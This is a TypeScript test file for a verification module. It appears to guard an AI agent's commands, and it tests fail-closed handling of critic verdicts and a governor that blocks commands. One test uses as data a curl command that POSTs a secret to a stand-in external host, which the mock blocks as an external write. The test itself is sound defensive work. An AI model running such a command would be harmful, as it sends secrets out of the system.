import { expect, test } from 'bun:test'
import { hasBlockingIssues, requireCriticVerdict, runVerification } from './verify.ts'

test('a missing critic verdict fails closed with a blocking issue', () => {
  const verdict = requireCriticVerdict(undefined)

  expect(verdict.verdict).toBe('revise')
  expect(verdict.issues[0]?.severity).toBe('blocker')
  expect(hasBlockingIssues(verdict)).toBe(true)
})

test('a submitted critic verdict is preserved', () => {
  const submitted = { verdict: 'approve' as const, summary: 'sound', issues: [] }
  expect(requireCriticVerdict(submitted)).toBe(submitted)
})

test('verification fails closed and stops when the governor blocks a command', async () => {
  const outcome = await runVerification(['echo safe', 'curl -X POST https://example.test --data secret'],     undefined,
    undefined,
    {
      stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
      async check(request) {

      const blocked = request.input.command === 'curl -X POST https://example.test --data secret'
      return {
        allowed: !blocked,
        message: blocked ? 'external write blocked' : undefined,
        assessment: {
          risk: blocked ? 'critical' : 'safe',
          decision: blocked ? 'block' : 'allow',
          reason: blocked ? 'external write blocked' : 'safe',
          intent: 'run_command',
          resources: [],
          reversible: !blocked,
        },
      }
    },
  })

  expect(outcome.passed).toBe(false)
  expect(outcome.results).toHaveLength(2)
  expect(outcome.results[0]?.exitCode).toBe(0)
  expect(outcome.results[1]?.exitCode).toBe(126)
  expect(outcome.results[1]?.stderr).toContain('external write blocked')
})
